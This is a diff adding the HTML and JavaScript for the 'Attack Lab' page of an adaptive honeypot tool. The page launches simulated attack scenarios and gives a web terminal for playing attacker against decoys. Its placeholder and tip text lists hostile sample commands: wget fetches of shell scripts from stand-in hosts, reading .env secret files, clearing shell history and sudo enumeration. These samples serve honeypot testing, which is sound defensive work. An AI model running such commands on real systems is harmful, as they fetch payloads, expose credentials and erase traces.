@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Attack Lab · Adaptive Honeypot</title>
+<link rel="icon" href="/img/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/css/style.css">
+<script>try{var t=localStorage.getItem('ahp-theme');if(t&&t!=='system')document.documentElement.dataset.theme=t}catch(e){}</script>
+<script src="/js/common.js"></script>
+</head>
+<body>
+<main class="wrap">
+  <div class="page-head">
+    <div><h1>Attack Lab</h1><p>Generate safe, realistic attacks against your own decoys, or become the attacker yourself in the web terminal. Nothing leaves this computer.</p></div>
+    <a class="btn" href="/dashboard.html">Watch on dashboard →</a>
+  </div>
+
+  <div class="grid g3">
+    <div class="card span2">
+      <div class="card-h"><h3>Attack scenarios</h3><button class="btn sm primary" id="runAll">Run all once</button></div>
+      <div class="grid g2" id="scen"></div>
+    </div>
+    <div class="card">
+      <h3>Continuous campaign</h3>
+      <p class="small muted">Launches random scenarios in the background, like a real internet-facing honeypot would see. Use it to let the adaptive engine learn.</p>
+      <div class="field"><label>Rate: <span id="rateV">6</span> attacks / minute</label><input type="range" id="rate" min="1" max="30" value="6"></div>
+      <button class="btn primary" id="camp" style="width:100%;justify-content:center"></button>
+      <hr>
+      <h4>Recent runs</h4>
+      <div id="recent" class="small"></div>
+      <div class="small muted" id="simStats" style="margin-top:8px"></div>
+    </div>
+  </div>
+
+  <div class="grid g3" style="margin-top:16px">
+    <div class="card span2">
+      <div class="card-h"><h3>Web terminal: you are the attacker</h3><div class="row"><span id="tProfile"></span><span id="tStrat"></span><span id="tThreat"></span><button class="btn sm" id="newSess">New session</button></div></div>
+      <div class="term" id="term"><div class="sys">Click inside and type a command, e.g. <b>whoami</b>, <b>ls -la /var/www/html</b>, <b>cat .env</b>, <b>wget http://evil.example.com/x.sh</b>, <b>sudo -l</b>, <b>history -c</b>…</div></div>
+    </div>
+    <div class="card">
+      <h3>What the engine sees</h3>
+      <div id="why" class="small muted">Run a few commands; profiling starts with the first one and the strategy is re-chosen after the 3rd.</div>
+      <h4 style="margin-top:12px">ATT&amp;CK techniques in this session</h4>
+      <div id="tTech" class="small"><span class="faint">none yet</span></div>
+      <hr>
+      <h4>Try these</h4>
+      <div class="stack small" id="tips"></div>
+    </div>
+  </div>
+</main>
+<script>
+(async function () {
+  const user = await AHP.init("lab", true);
+  if (!user) return;
+  const E = AHP.esc, $ = AHP.$;
+  const canOp = user.role !== "viewer";
+  const ICON = { telnet: "TEL", http: "WEB", modbus: "ICS", ftp: "FTP", ssh: "SSH" };
+  let status = await AHP.api("/api/sim/status");
+
+  $("#scen").innerHTML = Object.entries(status.scenarios).map(([k, s]) => `<div class="card" style="box-shadow:none;background:var(--surface-2)">
+      <div class="row" style="flex-wrap:nowrap"><div style="flex:none;width:44px;height:44px;border-radius:12px;background:var(--accent-soft);color:var(--accent);display:grid;place-items:center;font:700 12px var(--mono)">${ICON[s.sensor] || "?"}</div><div style="flex:1"><b>${E(s.label)}</b><div class="small muted">${E(s.desc)}</div></div></div>
+      <div class="row" style="margin-top:10px"><span class="badge">${E(s.sensor)}</span><span class="spacer"></span><button class="btn sm primary" data-run="${k}" ${canOp ? "" : "disabled"}>${AHP.icons.play} Run</button></div></div>`).join("");
+  AHP.$$("[data-run]").forEach((b) => (b.onclick = async () => { const r = await AHP.post("/api/sim/run", { scenario: b.dataset.run }); AHP.toast(`${r.label} launched from ${r.ip}`, "ok"); refresh(); }));
+  $("#runAll").onclick = async () => { for (const k of Object.keys(status.scenarios)) { await AHP.post("/api/sim/run", { scenario: k }); } AHP.toast("All scenarios launched", "ok"); refresh(); };
+  $("#rate").oninput = () => ($("#rateV").textContent = $("#rate").value);
+  $("#camp").onclick = async () => { status = await AHP.post("/api/sim/campaign", { on: !status.campaign, rate: +$("#rate").value }); refresh(); };
+
+  async function refresh() {
+    status = await AHP.api("/api/sim/status");
+    $("#camp").innerHTML = status.campaign ? `${AHP.icons.stop} Stop campaign` : `${AHP.icons.play} Start campaign`;
+    $("#camp").className = "btn " + (status.campaign ? "danger on" : "primary");
+    $("#rate").value = status.rate; $("#rateV").textContent = status.rate;
+    $("#recent").innerHTML = status.recent.length ? status.recent.slice().reverse().map((r) => `<div class="row" style="padding:4px 0;border-bottom:1px dashed var(--border)"><span class="faint mono">${AHP.fmtTime(r.ts)}</span><span>${E((status.scenarios[r.scenario] || {}).label || r.scenario)}</span><span class="spacer"></span><span class="mono faint">${E(r.ip)}</span>${r.ok ? "" : `<span class="badge bad" title="${E(r.error)}">err</span>`}</div>`).join("") : '<div class="faint">No runs yet</div>';
+    $("#simStats").textContent = `${status.runs} total runs · ${status.running} running now`;
+  }
+  refresh(); setInterval(refresh, 4000);
+
+  // ---- terminal
+  const term = $("#term");
+  let sid = null, prompt = "", busy = false;
+  const hist = []; let hi = 0;
+  function line(html) { const d = document.createElement("div"); d.innerHTML = html; term.appendChild(d); }
+  function inputLine() {
+    const d = document.createElement("div");
+    d.innerHTML = `<span class="pr">${E(prompt)}</span><input autocomplete="off" spellcheck="false" aria-label="terminal input">`;
+    term.appendChild(d); const inp = d.querySelector("input"); inp.focus();
+    inp.onkeydown = async (e) => {
+      if (e.key === "ArrowUp") { if (hi > 0) inp.value = hist[--hi]; e.preventDefault(); return; }
+      if (e.key === "ArrowDown") { inp.value = hi < hist.length - 1 ? hist[++hi] : (hi = hist.length, ""); e.preventDefault(); return; }
+      if (e.key !== "Enter" || busy) return;
+      const cmd = inp.value; inp.disabled = true; busy = true;
+      if (cmd.trim()) { hist.push(cmd); hi = hist.length; }
+      await send(cmd); busy = false;
+    };
+    term.scrollTop = term.scrollHeight;
+  }
+  async function send(cmd) {
+    if (!canOp) { line('<span class="sys">Viewers cannot use the lab terminal.</span>'); return; }
+    const r = await AHP.post("/api/lab/shell", { sid, cmd });
+    sid = r.sid; prompt = r.prompt;
+    if (r.output === "\x1b[2J\x1b[H") term.innerHTML = "";
+    else if (r.output) line(`<pre>${E(r.output)}</pre>`);
+    if (r.adapted) line(`<span class="sys">↺ adaptive engine switched strategy to "${E(AHP.STRAT[r.strategy])}" for this ${E((AHP.PROFILE[r.profile] || [r.profile])[0])}</span>`);
+    $("#tProfile").innerHTML = AHP.profile(r.profile); $("#tStrat").innerHTML = AHP.strategy(r.strategy); $("#tThreat").innerHTML = "threat " + AHP.threat(r.threat);
+    if (r.reasons) $("#why").innerHTML = r.reasons.length ? `<ul style="padding-left:18px;margin:0">${r.reasons.map((x) => `<li>${E(x)}</li>`).join("")}</ul>` : "Gathering signal…";
+    if (r.techniques) $("#tTech").innerHTML = r.techniques.length ? r.techniques.map((t) => `<div style="margin:3px 0"><span class="badge info">${E(t.split(" ")[0])}</span> ${E(t.split(" ").slice(1).join(" "))}</div>`).join("") : '<span class="faint">none yet</span>';
+    if (r.closed) { line('<span class="sys">Connection closed. Click "New session" to reconnect (your files persist, thanks to the consistency store).</span>'); sid = null; return; }
+    inputLine();
+  }
+  async function start() { term.innerHTML = ""; sid = null; await send(""); }
+  $("#newSess").onclick = start;
+  term.onclick = () => { const i = term.querySelector("input:not([disabled])"); if (i) i.focus(); };
+  const TIPS = ["cat /var/www/html/.env", "ls -la /root", "wget http://203.0.113.50/bot.sh", "echo hello > /tmp/note.txt", "cat /tmp/note.txt", "sudo -l", "history -c", "cat /proc/1/cgroup"];
+  $("#tips").innerHTML = TIPS.map((t) => `<a href="#" class="mono" data-tip="${E(t)}">${E(t)}</a>`).join("");
+  AHP.$$("[data-tip]").forEach((a) => (a.onclick = (e) => { e.preventDefault(); const i = term.querySelector("input:not([disabled])"); if (i) { i.value = a.dataset.tip; i.focus(); } }));
+  start();
+})();
+</script>
+</body>
+</html>
